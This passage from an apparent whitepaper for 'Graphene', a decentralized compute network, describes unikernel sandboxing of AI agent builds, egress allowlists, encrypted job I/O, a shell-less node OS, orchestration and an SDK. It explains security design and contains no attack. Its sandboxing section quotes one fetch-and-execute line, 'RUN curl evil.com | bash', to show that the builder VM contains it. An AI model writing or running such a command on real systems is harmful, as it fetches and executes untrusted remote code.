│   User: "Analyze this CSV and plot a graph"                 │
│                         │                                   │
│                         ▼                                   │
│   ┌─────────────────────────────────────────────┐           │
│   │              AI AGENT (Planner)              │           │
│   │                                             │           │
│   │  Generates:                                 │           │
│   │  • Dockerfile (code + deps)                 │           │
│   │  • manifest.json (resources, egress list)   │           │
│   │                                             │           │
│   │  ┌────────────────────────────────────┐     │           │
│   │  │ FROM python:3.11-slim-unikraft     │     │           │
│   │  │ COPY analyze.py /app/              │     │           │
│   │  │ RUN pip install pandas matplotlib  │     │           │
│   │  │ CMD ["python", "/app/analyze.py"]  │     │           │
│   │  └────────────────────────────────────┘     │           │
│   │                                             │           │
│   │  ⚠️  NO SHELL ACCESS                        │           │
│   │  ⚠️  NO NETWORK ACCESS                      │           │
│   │  ⚠️  NO RUNTIME ENVIRONMENT                 │           │
│   └─────────────────────┬───────────────────────┘           │
│                         │                                   │
│              Submit Dockerfile + Manifest + Ticket          │
│                         │                                   │
│                         ▼                                   │
│   ┌─────────────────────────────────────────────┐           │
│   │         GRAPHENE WORKER (Ephemeral Builder)    │           │
│   │                                             │           │
│   │  1. Spawn isolated Builder VM               │           │
│   │  2. Run BuildKit + Unikraft toolchain       │           │
│   │  3. Compile Dockerfile → .unik binary       │           │
│   │  4. Destroy Builder VM                      │           │
│   │  5. Boot production MicroVM with .unik      │           │
│   └─────────────────────┬───────────────────────┘           │
│                         │                                   │
│                         ▼                                   │
│   ┌─────────────────────────────────────────────┐           │
│   │              UNIKERNEL EXECUTION            │           │
│   │                                             │           │
│   │  • NO /bin/bash         (doesn't exist)    │           │
│   │  • NO pip/apt           (doesn't exist)    │           │
│   │  • NO process spawning  (single process)   │           │
│   │  • NO arbitrary egress  (allowlist only)   │           │
│   │                                             │           │
│   │  Can ONLY: Run analyze.py → Output result   │           │
│   └─────────────────────────────────────────────┘           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Key insight:** The `RUN pip install` in the Dockerfile executes *inside the ephemeral builder VM*, not on the host. Even if the AI writes malicious RUN commands, they're sandboxed in a disposable VM that has no access to host keys, files, or network.

### 8.3 Agent Architecture: Planner vs Executor

Graphene enforces a strict separation between the **Planner** (AI) and **Executor** (Runtime):

| Layer | Role | Has Shell? | Has Network? | Can Install? |
|-------|------|------------|--------------|--------------|
| **Planner (AI)** | Generate Dockerfile + manifest | No | No | No |
| **Builder VM** | Run BuildKit + Unikraft | Isolated | Package mirrors only (PyPI, npm) | Build-time only |
| **Executor** | Run sealed .unik binary | No | Allowlist only | No |

**The AI never touches the runtime.** It only produces a Dockerfile that is compiled by an isolated, ephemeral builder VM. The builder VM:
- Has no access to host keys, files, or network
- Is destroyed immediately after producing the .unik binary
- Cannot persist any state or communicate externally

Even if the AI writes `RUN curl evil.com | bash` in the Dockerfile, that command runs inside the disposable builder — not on the host or production runtime.

### 8.4 Why Unikernels Solve This

Traditional containers share a kernel with the host and include full OS userland:

```
Container:          Unikernel:
┌─────────────┐     ┌─────────────┐
│ App         │     │ App         │
├─────────────┤     ├─────────────┤
│ Libraries   │     │ Libraries   │
├─────────────┤     │ (linked)    │
│ /bin/bash   │     ├─────────────┤
│ /usr/bin/*  │     │ Minimal     │
│ apt/pip     │     │ Kernel      │
├─────────────┤     │ (no shell)  │
│ Linux       │     └─────────────┘
│ (shared)    │           │
└─────────────┘           │
      │                   │
      ▼                   ▼
┌─────────────┐     ┌─────────────┐
│ Host Kernel │     │ Hypervisor  │
│ (shared!)   │     │ (isolated)  │
└─────────────┘     └─────────────┘
```

**Unikernel properties:**
- **No shell**: `/bin/bash` doesn't exist, so `exec()` attacks fail
- **No package manager**: `pip install` at runtime is impossible
- **Single process**: No ability to fork or spawn processes
- **No syscall surface**: Only syscalls needed for the app are compiled in
- **Hypervisor isolation**: Even kernel exploits don't reach the host

### 8.5 Supply Chain Security

AI agents often request packages that could be compromised. Graphene mitigates this:

**1. Approved Package Mirrors**
Workers maintain mirrors of common packages (PyPI, npm) that are:
- Scanned for known vulnerabilities
- Signed by package maintainers
- Cached with content-addressing

**2. Dependency Pinning**
Manifests require exact versions and hashes:
```json
{
  "requirements": {
    "pandas": { "version": "2.1.0", "hash": "sha256:abc..." },
    "numpy": { "version": "1.26.0", "hash": "sha256:def..." }
  }
}
```

**3. Build Reproducibility**
Given identical inputs, builds produce identical outputs:
```
build(code + deps + kernel) → deterministic hash
```

Any tampering is detectable by hash mismatch.

### 8.6 Network Egress Controls

The manifest specifies an **allowlist** of permitted endpoints:

```json
{
  "network": {
    "egress_allowlist": [
      "api.openai.com",
      "storage.googleapis.com"
    ]
  }
}
```

**Enforcement:**
- Unikernel's network stack only permits connections to allowlisted hosts
- DNS resolution restricted to allowlist
- No arbitrary outbound connections possible
- Data exfiltration prevented at the hypervisor level

**Hardening Details:**
- DNS resolved once at connection time; IP pinned for session duration (prevents DNS rebinding)
- Connections to RFC1918/loopback addresses (10.x, 172.16.x, 192.168.x, 127.x) blocked regardless of allowlist
- TLS certificate chain validated against public roots; self-signed certificates rejected
- Wildcard patterns (e.g., `*.amazonaws.com`) expanded at build time, not runtime

### 8.7 Comparison: Shell-Based vs Graphene

| Capability | Shell-Based Agent | Graphene Agent |
|------------|-------------------|-------------|
| Run arbitrary commands | Yes (dangerous) | No |
| Install packages at runtime | Yes (supply chain risk) | No (build-time only) |
| Access host filesystem | Possible (escape risk) | No (hypervisor isolated) |
| Arbitrary network egress | Yes (exfil risk) | No (allowlist only) |
| Spawn processes | Yes | No (single process) |
| Survive reboot | Yes (persistence) | No (ephemeral) |
| Attack surface | Full OS userland | Single binary |

### 8.8 Triple-Layer Isolation

| Layer | Component | Protection |
|-------|-----------|------------|
| Build | Ephemeral Builder VM | Prevents host compromise during Docker `RUN` |
| Storage | Content Addressing | Prevents poisoned image attacks |
| Runtime | KVM Virtualization | Prevents guest-to-host escape |

Firecracker's attack surface is approximately 50,000 lines of Rust with minimal unsafe code in the critical path. KVM provides hardware-enforced isolation via Intel VT-x/AMD-V. This is the same security model used by AWS Lambda and Fly.io.

### 8.9 Slashing Conditions

Workers are slashed only for **observable misbehavior**:

| Violation | Penalty |
|-----------|---------|
| No response to accepted job | 1% of stake |
| Abandonment (no result after timeout) | Job value + 1% stake |
| Repeated availability lies | Progressive slashing |

**Not slashable** (without TEE):
- Incorrect results (handled by reputation)
- Data exfiltration (mitigated by network allowlist)

### 8.10 Unbonding Period

Workers requesting stake withdrawal enter a 14-day unbonding period. This prevents "slash and run" attacks and allows time for fraud proofs.

### 8.11 Computation Integrity

Graphene v1 guarantees **delivery** but not **correctness**. A malicious worker could return fabricated results. This is a known limitation shared by all non-TEE decentralized compute networks.

**Mitigations:**

| Strategy | Description |
|----------|-------------|
| Reputation | Workers with high failure/dispute rates receive fewer jobs |
| Redundant Execution | Users can submit identical jobs to N workers and compare results |
| Deterministic Builds | Content-addressed caching means same inputs → same binary; result divergence indicates dishonesty |
| TEE Attestation | Phase 4 adds cryptographic proof of correct execution |

For high-value computations requiring correctness guarantees before TEE support, users should employ redundant execution with majority voting.

### 8.12 Encrypted Job I/O

Graphene encrypts job inputs and outputs using keys derived from the payment channel relationship, providing "soft confidential computing" without requiring TEE hardware.

**Key Derivation:**
```
Channel Key = HKDF(ECDH(user_x25519, worker_x25519), salt=channel_pda)
Job Key = HKDF(ECDH(ephemeral, worker_x25519) || channel_key, salt=job_id)
```

**Properties:**
- **Payment-bound**: Only parties with valid payment channel can decrypt
- **Forward secrecy**: Per-job ephemeral keys protect past data if channel keys compromised
- **Automatic rotation**: Job ID in HKDF salt ensures unique key per job

**What Gets Encrypted:**

| Component | Encrypted? | Reason |
|-----------|------------|--------|
| Input blob | Yes | User's private data |
| Code blob | Yes | User's proprietary logic |
| Result blob | Yes | Computation output |
| stdout/stderr | Yes | May leak sensitive info |
| Job ID | No | Needed for routing |
| Resource requirements | No | Worker needs for allocation |
| Exit code | No | State machine needs |

**Encryption Scheme:** XChaCha20-Poly1305 with 192-bit random nonces (no nonce tracking required).

**Security Model:** Encrypted I/O requires a hardened node OS (Bottlerocket or equivalent) to achieve full "soft confidential" guarantees. Together they provide:
- No shell access for memory inspection
- No debugging tools
- Ephemeral execution window
- Economic incentive alignment

### 8.13 Future: TEE Integration

TEE (Intel SGX / AMD SEV) is planned as a premium tier. TEE and encrypted job I/O are **complementary**, not alternatives:

| Protection | Encrypted I/O | TEE | Both |
|------------|---------------|-----|------|
| Data in transit | ✅ | ❌ | ✅ |
| Data at rest (Iroh) | ✅ | ❌ | ✅ |
| Data during execution | ❌ | ✅ | ✅ |
| Forward secrecy | ✅ | ❌ | ✅ |
| Payment-bound keys | ✅ | ❌ | ✅ |
| Attestation | ❌ | ✅ | ✅ |

**Encrypted I/O remains required even with TEE** because:
- TEE doesn't encrypt blobs at rest in Iroh
- TEE doesn't provide forward secrecy
- TEE doesn't bind decryption to payment channel

When TEE is added, decryption moves inside the enclave, but the encryption layer stays.

**TEE Use Cases:**
- Proprietary AI model inference
- Sensitive data processing
- Cryptographic proof of correct execution

### 8.14 Hardened Node OS

Worker nodes run a purpose-built operating system designed to eliminate attack surface and prevent operator tampering. This "Graphene Node OS" is built with Yocto and enforces security guarantees at the OS level.

**Core Security Properties:**

| Property | Implementation |
|----------|----------------|
| **No Shell** | `/bin/sh`, `/bin/bash` removed from rootfs |
| **No SSH** | No remote shell access possible |
| **Read-Only Root** | dm-verity verified rootfs with signed root hash |
| **No Package Manager** | apk/apt/yum excluded from image |
| **Minimal Attack Surface** | <50MB image, only essential binaries |

**Shell-Less Architecture:**

Unlike traditional Linux servers, Graphene nodes have no shell interpreter:

```
Traditional Server:          Graphene Node:
┌─────────────────────┐     ┌─────────────────────┐
│ SSH → bash          │     │ Management API      │
│ └─> arbitrary cmds  │     │ └─> predefined ops  │
└─────────────────────┘     └─────────────────────┘
      ↓ Risk                       ↓ Safe
  Command injection            No shell to inject
  Privilege escalation         No shell to escalate
  Lateral movement             No interactive access
```

**Why This Matters:**

Even if an attacker compromises the management API or a MicroVM escapes its sandbox, they cannot:
- Execute arbitrary commands (no shell exists)
- Install backdoors (no package manager)
- Modify the rootfs (dm-verity rejects changes)
- Establish persistence (verified boot reloads clean image)

**dm-verity Integrity:**

The rootfs is protected by dm-verity, a kernel feature that verifies every block read against a Merkle tree:

```
┌────────────────────────────────────────────────┐
│                Root Hash                        │
│  (embedded in kernel or signed manifest)        │
└──────────────────────┬─────────────────────────┘
                       │
         ┌─────────────┴─────────────┐
         ▼                           ▼
    ┌─────────┐                 ┌─────────┐
    │ Hash L1 │                 │ Hash L1 │
    └────┬────┘                 └────┬────┘
         │                           │
    ┌────┴────┐                 ┌────┴────┐
    ▼         ▼                 ▼         ▼
┌───────┐ ┌───────┐         ┌───────┐ ┌───────┐
│Block 0│ │Block 1│   ...   │Block N│ │Block M│
└───────┘ └───────┘         └───────┘ └───────┘
```

If any block is modified (malware, rootkit, tampering), the hash chain breaks and the kernel panics rather than executing corrupted code.

**TPM-Based Attestation:**

Nodes with TPM 2.0 hardware provide cryptographic proof of their configuration:

| PCR | Contents | Purpose |
|-----|----------|---------|
| PCR 0 | Firmware | Verify UEFI not tampered |
| PCR 7 | Secure Boot | Verify boot chain integrity |
| PCR 14 | dm-verity root | Verify exact rootfs version |

During registration, workers generate a TPM quote signed by their Endorsement Key. The network verifies:
1. TPM is genuine (EK certificate chain)
2. PCR values match expected golden values
3. Node is running approved OS version

**Management Without Shell:**

Operators manage nodes through a secure API instead of SSH:

```bash
# Traditional (dangerous):
ssh root@node "systemctl restart graphene-worker"

# Graphene (safe):
graphenectl --node <node-id> drain
graphenectl --node <node-id> upgrade --version 1.2.0
graphenectl --node <node-id> reboot
```

See Section 12.5 for the full management API specification.

---

## 9. Worker Selection

### 9.1 Geographic Routing

Workers announce regions in gossip:

```json
{
  "regions": ["us-west", "us-east"],
  "coordinates": [37.77, -122.41]
}
```

Users specify routing preferences:

```json
{
  "routing": {
    "required_regions": ["eu-*"],
    "preferred_regions": ["eu-west"],
    "max_latency_ms": 50
  }
}
```

**Matching Algorithm:**
1. Filter by `required_regions` (compliance)
2. Sort by preference match, price, reputation
3. If `max_latency_ms` set, probe top candidates

### 9.2 Reputation System

Workers build reputation based on:
- Job success rate
- Response latency (p50, p99)
- Uptime percentage
- Settlement history

High-reputation workers receive priority in job matching.

---

## 10. Failure Handling

### 10.1 Exit Codes

| Exit Code | Meaning | User Refund | Worker Paid |
|-----------|---------|-------------|-------------|
| 0 | Success | N/A | Yes |
| 1-127 | User code error | 0% | Yes |
| 128 | User timeout exceeded | 0% | Yes |
| 200 | Worker crash | 100% | No |
| 201 | Worker resource exhausted | 100% | No |
| 202 | Build failure | 50% | Partial |

### 10.2 Result Delivery

Graphene supports **dual-mode result delivery** to optimize for different use cases:

**Sync Mode (Default)**
- Results stream directly to user over QUIC connection
- ~10ms latency for immediate feedback
- Skips DELIVERING state, transitions directly to DELIVERED
- Ideal for interactive workloads and real-time applications
- Automatic fallback to async if user disconnects

**Async Mode (Opt-in/Fallback)**
- Results uploaded as encrypted Iroh blobs
- 24-hour TTL for offline retrieval
- Uses DELIVERING state with eventual consistency
- Ideal for batch processing and offline users
- Supports chunked streaming for large results

**Result Payload Structure:**

```json
{
  "job_id": "...",
  "payload": {
    "type": "inline",  // sync: data included directly
    "encrypted_result": "<base64>",
    "encrypted_stdout": "<base64>",
    "encrypted_stderr": "<base64>"
  }
  // OR for async:
  "payload": {
    "type": "blob",  // async: fetch by hash
    "encrypted_result_hash": "blake3:abc...",
    "encrypted_stdout_hash": "blake3:def...",
    "encrypted_stderr_hash": "blake3:ghi..."
  },
  "exit_code": 0,
  "execution_ms": 4523,
  "worker_signature": "ed25519:..."
}
```

**Fallback Behavior:**
When sync delivery fails (connection refused, timeout, user offline), the worker automatically:
1. Uploads encrypted results to Iroh blob store
2. Transitions job to DELIVERING state
3. Broadcasts result availability on gossip network
4. User can fetch by hash within 24-hour TTL

### 10.3 Logging and Observability

**Job Logs:**
Jobs can write to stdout/stderr. Output is captured and included in the result blob (max 1MB). For longer output, jobs should write to a file included in the result.

**Structured Errors:**
Failed jobs return structured error information:

```json
{
  "error": {
    "code": "BUILD_TIMEOUT",
    "message": "Build exceeded 5 minute limit",
    "phase": "building",
    "elapsed_ms": 300000,
    "exit_code": 202
  }
}
```

| Error Code | Phase | Description |
|------------|-------|-------------|
| `TICKET_INVALID` | verification | Payment ticket signature invalid |
| `CHANNEL_EXHAUSTED` | verification | Insufficient channel balance |
| `BUILD_TIMEOUT` | building | Build exceeded time limit |
| `BUILD_OOM` | building | Build exceeded memory limit |
| `RUNTIME_TIMEOUT` | running | Execution exceeded max_duration_ms |
| `RUNTIME_OOM` | running | Execution exceeded memory_mb |
| `EGRESS_BLOCKED` | running | Attempted connection to non-allowlisted host |

**Worker Metrics:**
Workers expose a Prometheus-compatible `/metrics` endpoint for operators, including:
- `graphene_jobs_total{status="success|failed|timeout"}`
- `graphene_job_duration_seconds`
- `graphene_cache_hits_total{layer="L1|L2|L3"}`
- `graphene_channel_settlements_total`

---

## 11. Job Orchestration

Graphene supports composing multiple jobs into workflows, enabling pipelines, fan-out parallelism, and conditional execution.

### 11.1 Orchestration Modes

| Mode | Description | Use Case |
|------|-------------|----------|
| **Single** | One job, no dependencies | Simple functions |
| **DAG** | Pre-declared dependency graph | Known pipelines |
| **Dynamic** | Jobs spawn children at runtime | Conditional logic |

### 11.2 DAG Mode (Static Workflows)

When the workflow structure is known upfront, declare it in the manifest:

```json
{
  "orchestration": {
    "mode": "dag",
    "jobs": {
      "fetch": {
        "code_hash": "blake3:aaa...",
        "deps_hash": "blake3:bbb...",
        "entrypoint": "fetch.py"
      },
      "process": {
        "code_hash": "blake3:ccc...",
        "deps_hash": "blake3:ddd...",
        "entrypoint": "process.py",
        "depends_on": ["fetch"],
        "input_from": "fetch"
      },
      "summarize": {
        "code_hash": "blake3:eee...",
        "deps_hash": "blake3:fff...",
        "entrypoint": "summarize.py",
        "depends_on": ["process"],
        "input_from": "process"
      }
    },
    "entry": "fetch",
    "affinity": "same_worker"
  }
}
```

**Benefits of DAG mode:**
- Worker can pre-warm downstream jobs (fetch dependencies while job N runs)
- Payment calculated upfront (max cost known before execution)
- Clear failure semantics (abort workflow or retry failed step)
- Cache sharing between jobs on same worker

**DAG Pipelining:**

```
Time 0:  [fetch: running]     [process: loading deps]   [summarize: queued]
Time 1:  [fetch: done] ────▶  [process: starts]         [summarize: loading deps]
Time 2:                       [process: done] ────────▶ [summarize: starts]
Time 3:                                                 [summarize: done]
```

The worker pipelines dependency loading with execution, minimizing total latency.

### 11.3 Dynamic Mode (Runtime Spawning)

When workflow shape depends on runtime decisions, jobs can spawn children programmatically:

```python
# Inside a Graphene job
from graphene import spawn, fan_out

# Sequential spawn
result = spawn(
    code="process.py",
    input=my_output,
    affinity="same_worker"
)

# Parallel fan-out
results = fan_out(
    code="analyze.py",
    inputs=[chunk1, chunk2, chunk3, chunk4],
    affinity="distributed"
)
```

**Spawn Limits (prevent runaway costs):**

```json
{
  "orchestration": {
    "mode": "dynamic",
    "spawn_limits": {
      "max_depth": 3,
      "max_total_jobs": 50,
      "max_spawn_budget_usdc": 10.0
    }
  }
}
```

| Limit | Default | Description |
|-------|---------|-------------|
| `max_depth` | 3 | Maximum nesting level (job → child → grandchild) |
| `max_total_jobs` | 50 | Maximum jobs spawned in entire workflow |
| `max_spawn_budget_usdc` | 10.0 | Budget cap for all spawned jobs |

If any limit is exceeded, spawn fails and parent job receives an error.

### 11.4 Affinity Controls

Control where child jobs execute:

| Affinity | Behavior | Best For |
|----------|----------|----------|
| `same_worker` | Run on same node | Sequential chains, shared cache |
| `same_region` | Run on nearby node | Compliance, moderate latency |
| `distributed` | Run on any available node | Fan-out parallelism |

**Same-worker benefits:**
- Zero network transfer for intermediate results
- Shared dependency cache (L2 hits)
- Sub-millisecond dispatch latency

**Distributed benefits:**
- Parallel execution across many nodes
- Not limited by single node's resources
- Better for CPU-bound fan-out

### 11.5 Inter-Job Data Passing

**Same-worker:** Results passed via shared memory or local filesystem. Zero serialization overhead for large artifacts.

**Distributed:** Results uploaded as Iroh blobs. Child job fetches by hash.

```
Same-worker:     Job A ──[memory]──▶ Job B     (< 1ms)
Distributed:     Job A ──[iroh blob]──▶ Job B  (network latency)
```

### 11.6 Payment for Child Jobs

**Same-worker (shared channel):**
- All jobs deduct from parent's payment channel
- Single settlement at workflow completion
- Worker tracks cumulative usage

**Distributed (nested tickets):**
- Parent issues sub-ticket for remote child
- Child's worker validates sub-ticket independently
- Each worker settles their portion

```
┌─────────────────────────────────────────────────────────────┐
│                     USER PAYMENT CHANNEL                     │
│                        Balance: 100 USDC                     │
└───────────────┬─────────────────────────────┬───────────────┘
                │                             │
         Ticket: 5 USDC                Sub-ticket: 3 USDC
                │                             │
                ▼                             ▼
         ┌──────────┐                  ┌──────────┐
         │ Worker A │ ───[spawn]────▶  │ Worker B │
         │ (parent) │                  │ (child)  │
         └──────────┘                  └──────────┘
```

### 11.7 Failure Handling in Workflows

| Failure | DAG Mode | Dynamic Mode |
|---------|----------|--------------|
| Job fails (user error) | Abort workflow, return partial results | Parent receives error, decides |
| Job fails (worker fault) | Retry on same/different worker | Parent can retry spawn |
| Spawn limit exceeded | N/A | Spawn returns error |
| Budget exhausted | Abort remaining jobs | Spawn returns error |

**Partial results:** For fan-out patterns, completed results are returned even if some branches fail. User code handles partial success.

### 11.8 Example: Map-Reduce Pattern

```json
{
  "orchestration": {
    "mode": "dag",
    "jobs": {
      "split": {
        "code_hash": "blake3:split...",
        "entrypoint": "split.py"
      },
      "map_0": { "depends_on": ["split"], "input_from": "split.chunks[0]", "..." : "..." },
      "map_1": { "depends_on": ["split"], "input_from": "split.chunks[1]", "..." : "..." },
      "map_2": { "depends_on": ["split"], "input_from": "split.chunks[2]", "..." : "..." },
      "map_3": { "depends_on": ["split"], "input_from": "split.chunks[3]", "..." : "..." },
      "reduce": {
        "depends_on": ["map_0", "map_1", "map_2", "map_3"],
        "input_from": ["map_0", "map_1", "map_2", "map_3"],
        "code_hash": "blake3:reduce...",
        "entrypoint": "reduce.py"
      }
    },
    "entry": "split",
    "affinity": {
      "split": "any",
      "map_*": "distributed",
      "reduce": "any"
    }
  }
}
```

```
              ┌─────────┐
              │  split  │
              └────┬────┘
       ┌──────┬───┴────┬──────┐
       ▼      ▼        ▼      ▼
   ┌──────┐┌──────┐┌──────┐┌──────┐
   │map_0 ││map_1 ││map_2 ││map_3 │  (parallel, distributed)
   └──┬───┘└──┬───┘└──┬───┘└──┬───┘
       └──────┴───┬────┴──────┘
                  ▼
              ┌────────┐
              │ reduce │
              └────────┘
```

---

## 12. Network Topology

### 12.1 Discovery

All workers subscribe to `graphene-compute-v1` gossip topic. Announcements include:
- Node ID (Ed25519 public key)
- Capabilities (vCPU, RAM, GPU, regions)
- Pricing
- Current load

### 12.2 Direct Connections

After discovery, users connect directly to workers via Magicsock:
- NAT traversal via UDP hole-punching
- Fallback to DERP relays
- Connection identified by public key (not IP)

### 12.3 Global Cache

Dependency blobs are content-addressed and shared peer-to-peer:
- Node A builds `pytorch-v2` → announces hash
- Node B needs same deps → fetches from A (or any seeder)
- Popular dependencies propagate network-wide

### 12.4 Worker Lifecycle State Machine

```
                         ┌────────────────┐
                         │                │
        Install binary   │  UNREGISTERED  │
       ──────────────────▶                │
                         │                │
                         └───────┬────────┘
                                 │
                                 │ Stake $GRAPHENE on Solana
                                 ▼
                         ┌────────────────┐
                         │                │
                         │   REGISTERED   │
                         │ (stake locked) │
                         │                │
                         └───────┬────────┘
                                 │
                                 │ Join gossip network
                                 ▼
                         ┌────────────────┐
                         │                │◀──────────────────┐
                         │    ONLINE      │                   │
                         │ (advertising)  │                   │
                         │                │                   │
                         └───────┬────────┘                   │
                                 │                            │
               ┌─────────────────┼─────────────────┐          │
               │                 │                 │          │
               ▼                 ▼                 ▼          │
       ┌──────────────┐  ┌──────────────┐  ┌──────────────┐   │
       │              │  │              │  │              │   │
       │    BUSY      │  │   DRAINING   │  │   OFFLINE    │───┘
       │ (at capacity)│  │ (no new jobs)│  │ (connection  │
       │              │  │              │  │    lost)     │
       └──────┬───────┘  └──────┬───────┘  └──────────────┘
              │                 │
              │                 │ All jobs complete
              │                 ▼
              │          ┌──────────────┐
              │          │              │
              │          │  UNBONDING   │
              │          │  (14 days)   │
              │          │              │
              │          └──────┬───────┘
              │                 │
              │                 │ Unbonding period ends
              │                 ▼
              │          ┌──────────────┐
              │          │              │
              └─────────▶│   EXITED     │
                         │(stake returned│
                         │              │
                         └──────────────┘
```

**Worker States:**

| State | Can Accept Jobs | Stake Status |
|-------|-----------------|--------------|
| UNREGISTERED | No | None |
| REGISTERED | No | Locked |
| ONLINE | Yes | Locked |
| BUSY | No (at capacity) | Locked |
| DRAINING | No | Locked |
| OFFLINE | No | Locked (slashing risk) |
| UNBONDING | No | Locked (14 day wait) |
| EXITED | No | Returned |

**State Transitions:**

| From | To | Trigger |
|------|----|---------|
| UNREGISTERED | REGISTERED | `stake()` tx confirmed |
| REGISTERED | ONLINE | Join gossip, start heartbeat |
| ONLINE | BUSY | All job slots filled |
| BUSY | ONLINE | Job slot freed |
| ONLINE | DRAINING | Operator initiates shutdown |
| DRAINING | UNBONDING | All active jobs complete |
| ONLINE | OFFLINE | Heartbeat timeout (5 min) |
| OFFLINE | ONLINE | Reconnect within grace period |
| OFFLINE | SLASHED | Grace period exceeded (1 hr) |
| UNBONDING | EXITED | 14 days elapsed |

### 12.5 Node Configuration

Graphene nodes are managed remotely through a secure API, replacing traditional SSH-based administration. This approach eliminates shell access while providing all necessary operational capabilities.

**Management Architecture:**

```
┌─────────────────┐         ┌─────────────────────────────────┐
│   graphenectl   │         │         Graphene Node           │
│   (operator)    │         │                                 │
└────────┬────────┘         │  ┌───────────────────────────┐  │
         │                  │  │    Management Daemon       │  │
         │ QUIC/Iroh        │  │    (Rust binary)          │  │
         │ (encrypted)      │  │                           │  │
         └──────────────────┼──│  • Config validation      │  │
                            │  │  • Lifecycle control      │  │
                            │  │  • Log streaming          │  │
                            │  │  • Metrics export         │  │
                            │  └───────────────────────────┘  │
                            │                                 │
                            │  ┌───────────────────────────┐  │
                            │  │    Worker Process         │  │
                            │  └───────────────────────────┘  │
                            └─────────────────────────────────┘
```

**Capability-Based Authentication:**

Instead of passwords or SSH keys, `graphenectl` uses capability tokens derived from a root secret:

```
Root Secret (operator holds)
         │
         ├─► Admin Token    (full control)
         │
         ├─► Operator Token (lifecycle, config)
         │
         └─► Reader Token   (status, logs only)
```

Token derivation uses HKDF:
```
token = HKDF(root_secret, salt=node_id, info=role)
```

**Key Properties:**
- Tokens are revocable by rotating the root secret
- Tokens are role-scoped (cannot escalate privileges)
- Tokens are node-specific (cannot use on other nodes)
- No shared secrets stored on nodes (derived on-demand)

**Management Commands:**

| Command | Role Required | Description |
|---------|--------------|-------------|
| `graphenectl status` | Reader | Show node health and metrics |
| `graphenectl logs` | Reader | Stream worker logs |
| `graphenectl drain` | Operator | Stop accepting new jobs |
| `graphenectl apply` | Operator | Update configuration |
| `graphenectl upgrade` | Admin | Stage OS upgrade |
| `graphenectl reboot` | Admin | Reboot node |
| `graphenectl register` | Admin | Register with Solana |
| `graphenectl cap issue` | Admin | Generate new capability token |

**Configuration Flow:**

```
┌─────────────────┐
│ 1. Write config │
│    (YAML file)  │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌─────────────────┐
│ 2. graphenectl  │────▶│ 3. Node daemon  │
│    apply        │     │    validates    │
└─────────────────┘     └────────┬────────┘
                                 │
                    ┌────────────┴────────────┐
                    ▼                         ▼
             ┌───────────┐             ┌───────────┐
             │ 4a. Valid │             │ 4b. Invalid│
             │  → Apply  │             │  → Reject  │
             └───────────┘             └───────────┘
```

Configuration is validated before application:
- Schema validation (required fields, types)
- Resource limits (within node capacity)
- Network rules (valid CIDR, ports)
- Stake requirements (meets minimums)

**Remote Upgrade Process:**

OS upgrades are staged and verified before activation:

```
┌─────────────────┐
│ 1. Stage image  │
│    (download)   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 2. Verify hash  │
│    (SHA256)     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 3. Drain jobs   │
│    (graceful)   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 4. Switch root  │
│    (atomic)     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│ 5. Reboot       │
│    (verified)   │
└─────────────────┘
```

If the new image fails to boot, the bootloader automatically reverts to the previous known-good image.

**Log Streaming:**

Operators can stream logs without shell access:

```bash
# Stream all worker logs
graphenectl logs --follow

# Filter by severity
graphenectl logs --level=error

# Search historical logs
graphenectl logs --since=1h --grep="payment"
```

Logs are structured JSON, enabling automated monitoring and alerting.

**Metrics Export:**

Nodes expose Prometheus-compatible metrics via the management API:

```bash
# Fetch current metrics
graphenectl metrics

# Continuous export to Prometheus
graphenectl metrics --prometheus-push=http://monitor:9091
```

See Appendix F for the complete node configuration schema.

---

## 13. SDK Quick Start

### 13.1 Installation

```bash
# Python
pip install graphene-sdk

# TypeScript
npm install @graphene/sdk

# Rust
cargo add graphene-sdk
```

### 13.2 Simple Function Execution

```python
from graphene import Client

# Connect using local wallet (~/.config/solana/id.json)
client = Client()

# Execute a simple Python function
result = client.run(
    code="""
def main(data):
    return {"sum": sum(data["numbers"])}
""",
    input={"numbers": [1, 2, 3, 4, 5]},
    resources={"vcpu": 1, "memory_mb": 512}
)

print(result.output)  # {"sum": 15}
print(result.duration_ms)  # 234
print(result.cost_usdc)  # 0.0001
```

### 13.3 Dockerfile-Based Jobs

```python
from graphene import Client, Manifest

client = Client()

# Build and run from Dockerfile
result = client.run(
    dockerfile="./Dockerfile",
    manifest=Manifest(
        vcpu=2,
        memory_mb=2048,
        max_duration_ms=60000,
        egress=["api.openai.com", "huggingface.co"]
    ),
    input_file="data.csv"
)

# Stream logs while running
for line in client.logs(result.job_id):
    print(line)

# Fetch result
output = result.download("output.json")
```

### 13.4 Workflow Execution

```python
from graphene import Client, DAG

client = Client()

# Define a map-reduce workflow
workflow = DAG()
workflow.add("fetch", code="fetch.py")
workflow.add("process", code="process.py", depends_on=["fetch"])
workflow.add("summarize", code="summarize.py", depends_on=["process"])

# Execute with automatic dependency resolution
result = client.run_workflow(
    workflow,
    entry="fetch",
    affinity="same_worker"
)

print(result.jobs["summarize"].output)
```

### 13.5 TypeScript Example

```typescript
import { Client } from '@graphene/sdk';

const client = new Client();

const result = await client.run({
  code: `
    export function main(input: { x: number }) {
      return { squared: input.x ** 2 };
    }
  `,
  input: { x: 42 },
  resources: { vcpu: 1, memoryMb: 512 }
});

console.log(result.output); // { squared: 1764 }
```

---

## 14. Roadmap

### Phase 1: Engine (Q1 2026)
- Single-node worker binary
- Iroh P2P networking
- Firecracker + Unikraft integration
- Mock payment verification

### Phase 2: Network (Q2 2026)
- Multi-node testnet
- Solana Devnet integration
- Payment channel implementation
- Global cache syncing

### Phase 3: Launch (Q3 2026)
- Anchor program audit
- $GRAPHENE token generation
- Mainnet launch
- SDK release (Python, TypeScript, Rust)

### Phase 4: Scale (Q4 2026+)
- GPU compute support
- Confidential compute tier (TEE)
- Geographic expansion
- Enterprise features

---

## 15. Technical Stack

| Component | Technology | Purpose |
|-----------|------------|---------|
| Settlement | Solana + Anchor | Payment channels, staking |
| Networking | Iroh | P2P discovery, data transfer |
| Compute | Firecracker | MicroVM runtime |
| Unikernels | Unikraft + BuildKit | Dockerfile → minimal kernel |
| Signatures | Ed25519 | Payment tickets, identity |

---

## Appendix A: Manifest Schema

```json
{
  "$schema": "https://graphene.network/schemas/manifest-v1.json",
  "version": "1.0",
